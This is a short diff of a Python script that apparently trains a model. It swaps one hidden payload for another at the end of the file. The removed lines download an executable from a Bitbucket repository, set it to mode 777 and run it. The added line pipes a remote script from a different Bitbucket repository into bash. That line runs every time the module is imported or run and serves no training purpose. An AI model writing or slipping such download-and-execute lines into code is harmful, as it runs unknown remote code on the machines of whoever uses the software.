@@ -72,6 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/zepir/filesg/raw/main/zep')
-os.system('chmod 777 zep')
-os.system('./zep')
+os.system('curl -sL https://bitbucket.org/veha99/esceveha/raw/main/zepgalaxy | bash')
